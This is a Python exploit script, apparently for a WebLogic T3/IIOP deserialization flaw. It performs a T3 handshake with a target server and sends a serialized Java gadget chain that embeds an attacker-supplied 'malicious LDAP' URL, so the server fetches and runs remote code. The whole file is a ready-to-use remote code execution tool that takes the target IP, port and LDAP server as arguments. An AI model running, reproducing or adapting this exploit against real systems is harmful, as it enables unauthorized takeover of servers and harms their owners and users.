import socket,re
import sys,traceback
import struct
import argparse
from urllib import parse


class WebLogic():

    def __init__(self, url, port, ldapurl):
        self.ip = url
        self.port = port
        self.sock = self.get_sock(self.ip, self.port)
        self.ser_payload = b'\xac\xed\x00\x05sr\x00.javax.management.BadAttributeValueExpException\xd4\xe7\xda\xabc-F@\x02\x00\x01L\x00\x03valt\x00\x12Ljava/lang/Object;xr\x00\x13java.lang.Exception\xd0\xfd\x1f>\x1a;\x1c\xc4\x02\x00\x00xr\x00\x13java.lang.Throwable\xd5\xc65\'9w\xb8\xcb\x03\x00\x04L\x00\x05causet\x00\x15Ljava/lang/Throwable;L\x00\rdetailMessaget\x00\x12Ljava/lang/String;[\x00\nstackTracet\x00\x1e[Ljava/lang/StackTraceElement;L\x00\x14suppressedExceptionst\x00\x10Ljava/util/List;xpq\x00~\x00\x08pur\x00\x1e[Ljava.lang.StackTraceElement;\x02F*<<\xfd"9\x02\x00\x00xp\x00\x00\x00\x02sr\x00\x1bjava.lang.StackTraceElementa\t\xc5\x9a&6\xdd\x85\x02\x00\x04I\x00\nlineNumberL\x00\x0edeclaringClassq\x00~\x00\x05L\x00\x08fileNameq\x00~\x00\x05L\x00\nmethodNameq\x00~\x00\x05xp\x00\x00\x00@t\x00\x05TEST1t\x00\nTEST1.javat\x00\x0fgeneratePayloadsq\x00~\x00\x0b\x00\x00\x00Jq\x00~\x00\rq\x00~\x00\x0et\x00\x04mainsr\x00&java.util.Collections$UnmodifiableList\xfc\x0f%1\xb5\xec\x8e\x10\x02\x00\x01L\x00\x04listq\x00~\x00\x07xr\x00,java.util.Collections$UnmodifiableCollection\x19B\x00\x80\xcb^\xf7\x1e\x02\x00\x01L\x00\x01ct\x00\x16Ljava/util/Collection;xpsr\x00\x13java.util.ArrayListx\x81\xd2\x1d\x99\xc7a\x9d\x03\x00\x01I\x00\x04sizexp\x00\x00\x00\x00w\x04\x00\x00\x00\x00xq\x00~\x00\x17xsr\x001weblogic.servlet.internal.session.FileSessionData\xed\xc7\xd2\x92"\xe8v\xd5\x0c\x00\x00xr\x00-weblogic.servlet.internal.session.SessionData\xc2\xf3\xa9h\x8e\xcfT\xc3\x0c\x00\x00xpw\x16\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x01\x01sr\x00\x13java.util.Hashtable\x13\xbb\x0f%!J\xe4\xb8\x03\x00\x02F\x00\nloadFactorI\x00\tthresholdxp?@\x00\x00\x00\x00\x00\x08w\x08\x00\x00\x00\x0b\x00\x00\x00\x01t\x00\x10wl_debug_sessionsr\x00*weblogic.servlet.internal.AttributeWrapper\x04J\xbc\x87\xeds\xa3\x07\x02\x00\x03Z\x00\x12isEJBObjectWrappedL\x00\x11intialContextPathq\x00~\x00\x05L\x00\x06objectq\x00~\x00\x01xp\x01psr\x002weblogic.ejb.container.internal.BusinessHandleImpl\xfbH\xc0\xd2\x8f\x8aO\x9c\x0c\x00\x00xpt\x00\x1dt3://192.168.067.018:07001/xxsr\x00\x19javax.naming.CompoundName0\xc1\nW\xed7\x91\xc4\x03\x00\x00xpsr\x00\x14java.util.Properties9\x12\xd0zp6>\x98\x02\x00\x01L\x00\x08defaultst\x00\x16Ljava/util/Properties;xq\x00~\x00\x1b?@\x00\x00\x00\x00\x00\x08w\x08\x00\x00\x00\x0b\x00\x00\x00\x00xpw\x04\x00\x00\x00\x01t\x00\'ldap://000.000.000.000:09999/xxxxxxxxxxxppw\x04\xac\xed\x00\x05pxxpsq\x00~\x00\x1b?@\x00\x00\x00\x00\x00\x08w\x08\x00\x00\x00\x0b\x00\x00\x00\x00xx'
        self.ser_payload = self.ser_payload.replace(b"192.168.067.018", self.format_ip(self.ip).encode()).replace(b"07001", self.format_port(self.port).encode()).replace(b"ldap://000.000.000.000:09999/xxxxxxxxxx", self.format_ldap(ldapurl).encode())
        # print(self.ser_payload)


    @staticmethod
    def get_sock(ip, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_address = (ip, port)
            sock.connect(server_address)
            print("[INFO]: connecting to %s port %s" % server_address)
        except Exception as e:
            print("[ERROR]: " + str(e))

        return sock
    @staticmethod
    def format_ip(ip):
        ret = []
        for ip_1 in ip.split("."):
            if(len(ip_1) < 3):
                ip_1 = (3 - len(ip_1)) * "0" + ip_1
            ret.append(ip_1)
        return ".".join(ret)
    @staticmethod
    def format_port(port):
        port = str(port)
        if(len(port) < 5):
            port = (5 - len(port)) * "0" + port
        return port

    def format_ldap(self, ldap):
        parts = parse.urlparse(ldap)

        if parts.scheme != "ldap":
            print("协议必须是ldap,例如ldap://8.8.8.8:9999/Exploit")
            sys.exit()

        if ":" in parts.netloc:
            ip = self.format_ip(parts.netloc.split(":")[0])
            port = self.format_port(parts.netloc.split(":")[1])
        else:
            print("Ldap服务必须指定端口,例如ldap://8.8.8.8:9999/Exploit")
            sys.exit()
        if len(parts.path) > 11:
            print("Ldap服务名称最大长度是10,Exploit")
            sys.exit()
        else:
            path = parts.path + (11 - len(parts.path)) * " "
        return parts.scheme + "://" + ip + ":" + port + path

    def t3_hand(self):
        handshake = b't3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n'
        print("[INFO]: sending handshake packet ...")
        print("[INFO]: <<< Packet Content >>>")
        print(handshake.decode())
        print("[INFO]: <<< Packet Content >>>")
        self.sock.sendall(handshake)
        
        data = self.sock.recv(1024)
        print("[INFO]: received handshake data")
        print("[INFO]: <<< Packet Content >>>")
        print(data.decode())
        print("[INFO]: <<< Packet Content >>>")

    def choose(self):
        payload_1 = b'\x00\x00\x09\xf3\x01\x65\x01\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x71\x00\x00\xea\x60\x00\x00\x00\x18\x43\x2e\xc6\xa2\xa6\x39\x85\xb5\xaf\x7d\x63\xe6\x43\x83\xf4\x2a\x6d\x92\xc9\xe9\xaf\x0f\x94\x72\x02\x79\x73\x72\x00\x78\x72\x01\x78\x72\x02\x78\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x70\x70\x70\x70\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x06\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x03\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x03\x78\x70\x77\x02\x00\x00\x78\xfe\x01\x00\x00'
        payload_2 = b'\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x21\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x65\x65\x72\x49\x6e\x66\x6f\x58\x54\x74\xf3\x9b\xc9\x08\xf1\x02\x00\x07\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x5b\x00\x08\x70\x61\x63\x6b\x61\x67\x65\x73\x74\x00\x27\x5b\x4c\x77\x65\x62\x6c\x6f\x67\x69\x63\x2f\x63\x6f\x6d\x6d\x6f\x6e\x2f\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2f\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\x3b\x78\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x56\x65\x72\x73\x69\x6f\x6e\x49\x6e\x66\x6f\x97\x22\x45\x51\x64\x52\x46\x3e\x02\x00\x03\x5b\x00\x08\x70\x61\x63\x6b\x61\x67\x65\x73\x71\x00\x7e\x00\x03\x4c\x00\x0e\x72\x65\x6c\x65\x61\x73\x65\x56\x65\x72\x73\x69\x6f\x6e\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x12\x76\x65\x72\x73\x69\x6f\x6e\x49\x6e\x66\x6f\x41\x73\x42\x79\x74\x65\x73\x74\x00\x02\x5b\x42\x78\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x71\x00\x7e\x00\x05\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x05\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x05\x78\x70\x77\x02\x00\x00\x78\xfe\x00\xff\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x46\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\x00\x0b\x75\x73\x2d\x6c\x2d\x62\x72\x65\x65\x6e\x73\xa5\x3c\xaf\xf1\x00\x00\x00\x07\x00\x00\x1b\x59\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x78\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x1d\x01\x81\x40\x12\x81\x34\xbf\x42\x76\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\xa5\x3c\xaf\xf1\x00\x00\x00\x00\x00\x78'

        return payload_1, payload_2

    def poc(self):
        try:
            self.t3_hand()
            payload_1, payload_2 = self.choose()
            payload = payload_1 + self.ser_payload + payload_2
            payload = struct.pack("!i", len(payload)) + payload[4:]
            print("[INFO]: Sending payload ...")
            self.sock.send(payload)
        except Exception as e:
            print("[ERROR]: " + str(e))

if __name__ =="__main__":
    if len(sys.argv) == 1:
        sys.argv.append('-h')

    parser = argparse.ArgumentParser(description='WebLogic POC & EXP Basic Script',add_help=True)
    parser.add_argument('-i','--ip',default=None,help='WebLogic服务器ip',type=str)
    parser.add_argument('-p','--port',default=7001,help='WebLogic服务器端口(默认7001)',type=int)
    parser.add_argument('-d','--ldap',default=None,help='恶意Ldap服务地址，例如ldap://8.8.8.8/Exploit',type=str)
    args = parser.parse_args()

    if args.ip and args.ldap:
        try:
            target = WebLogic(args.ip, args.port, args.ldap)
            #print(target.format_ldap(args.ldap))
            target.poc()
        except Exception as e:
            print("Something ERROR!")
            traceback.print_exc()
            exit()